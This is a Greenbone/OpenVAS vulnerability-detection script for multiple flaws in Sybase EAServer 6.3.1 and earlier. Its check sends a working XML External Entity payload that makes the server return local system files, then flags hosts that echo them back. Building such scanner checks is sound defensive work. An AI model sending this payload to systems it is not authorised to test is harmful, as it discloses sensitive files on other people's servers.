# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103752");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Sybase EAServer Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61358");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-08-08 13:44:48 +0200 (Thu, 08 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Jetty_EAServer/banner");

  script_tag(name:"impact", value:"Successful exploits will allow attackers to download and upload
  arbitrary files on the affected computer, obtain potentially sensitive
  information and execute arbitrary commands with the privileges of the
  user running the affected application.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP XML POST request and check the response.");

  script_tag(name:"insight", value:"1. A directory-traversal vulnerability

  2. An XML External Entity injection

  3. A command execution vulnerability");

  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Sybase EAServer is prone to multiple security vulnerabilities.");

  script_tag(name:"affected", value:"Sybase EAServer 6.3.1 and prior are vulnerable.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if("Server: Jetty(EAServer/" >!< banner)
  exit(0);

url = "/rest/public/xml-1.0/testDataTypes";
files = traversal_files();
host = http_host_name(port:port);

foreach file(keys(files)) {

  xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///' + files[file]  + '">]>
  <vttest>
  <dt>
  <stringValue>&xxe;</stringValue>
  <booleanValue>0</booleanValue>
  </dt>
  </vtttest>';

  len = strlen(xml);

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: text/xml\r\n' +
        'Content-Length: ' + len  + '\r\n' +
        '\r\n' + xml;
  result = http_send_recv(port:port, data:req, bodyonly:TRUE);

  if("<testDataTypesResponse>" >!<result)
    continue;

  cont = split(result, sep:"<stringValue>", keep:FALSE);
  if(isnull(cont[1]))
    continue;

  if(ereg(pattern:file, string:cont[1])) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
